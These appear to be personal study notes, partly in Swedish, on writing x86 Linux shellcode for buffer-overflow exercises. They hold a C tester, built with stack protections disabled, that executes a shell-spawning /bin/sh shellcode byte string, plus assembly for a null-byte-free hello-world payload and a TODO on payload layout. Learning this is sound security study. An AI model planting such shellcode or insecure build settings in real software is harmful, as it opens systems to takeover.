Tester program: 
gcc tester.c -o tester -fno-stack-protector -z execstack -no-pie
------------------------------------------------------------------------
#include <stdio.h>
#include <string.h>

char code[] = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f"
              "\x73\x68\x68\x2f\x62\x69\x6e\x89"
              "\xe3\xb0\x0b\xcd\x80";

int main(int argc, char **argv)
{
 printf ("Shellcode length : %d bytes\n", strlen (code));
 int(*f)()=(int(*)())code;
 f();
}
------------------------------------------------------------------------
Basic shellcode: (GAS, GNU Assembler, using the AT&T Syntax)
gcc -c shellcode.s                  <--- Compile (## as shellcode.s -o shellcode.o /nasm är ett annat alternativ)
ld shellcode.o -o shellcode         <--- Link
------------------------------------------------------------------------
.global	_start

.text
_start:
	movl  $4, %eax   # 4 (code for "write" syscall) -> EAX register
	movl  $1, %ebx   # 1 (file descriptor for stdout) -> EBX (1st argument to syscall)
	movl  $msg, %ecx # address of msg string -> ECX (2nd argument)
	movl  $len, %edx # len (32 bit address) -> EDX (3rd arg)
	int   $0x80      # interrupt with location 0x80 (128), which invokes the kernel's system call procedure

	movl  $1, %eax   # 1 ("exit") -> EAX
	movl  $0, %ebx   # 0 (with success) -> EBX
	int   $0x80      # see previous
.data
msg:
	.ascii  "Hello, world!\n" # inline ascii string
	len =   . - msg           # assign value of (current address - address of msg start) to symbol "len"
------------------------------------------------------------------------
objdump -M -d ./shellcode
------------------------------------------------------------------------
./shellcode:     file format elf32-i386

Disassembly of section .text:

08048074 <_start>:
 8048074:       b8 04 00 00 00          mov    eax,0x4
 8048079:       bb 01 00 00 00          mov    ebx,0x1
 804807e:       b9 98 90 04 08          mov    ecx,0x8049098
 8048083:       ba 0e 00 00 00          mov    edx,0xe
 8048088:       cd 80                   int    0x80
 804808a:       b8 01 00 00 00          mov    eax,0x1
 804808f:       bb 00 00 00 00          mov    ebx,0x0
 8048094:       cd 80                   int    0x80
 ------------------------------------------------------------------------
 Skriv om utan NULL-bytes:
 ------------------------------------------------------------------------
.global	_start

.text
_start:
	xor   %eax, %eax
	mov   $4, %al 	 # <--- Dessa två eliminerar null-bytes, men gör samma som: mov eax,0x4

	xor   %ebx, %ebx
	mov   $1, %bl 	 # <--- Dessa två eliminerar null-bytes, men gör samma som: mov eax,0x1

	movl  $msg, %ecx # address of msg string -> ECX (2nd argument)

	xor %edx, %edx
	mov $0xe, %dl 	# <--- Längd av sträng

	int   $0x80      # interrupt with location 0x80 (128), which invokes the kernel's system call procedure

	# ALLT UNDER HÄR KAN TAS BORT NÄR MAN KÖR BUFFER OVERFLOW, BARA HÄR NU FÖR ATT TESTA SCRIPTET
	xor %eax, %eax
	mov $1, %al 

	xor %ebx, %ebx

	int   $0x80      # see previous
.data
msg:
	.ascii  "Hello, world!\n" # inline ascii string
	len =   . - msg           # assign value of (current address - address of msg start) to symbol "len"
------------------------------------------------------------------------
Gör så att strängen man vill skriva ut skickas med i payload?
------------------------------------------------------------------------
TODO: Lägg strängen efter shellcode i payload? Sen peka ecx på den adressen (uträknad från saved eip) och
	  skrivs direkt i opcode. 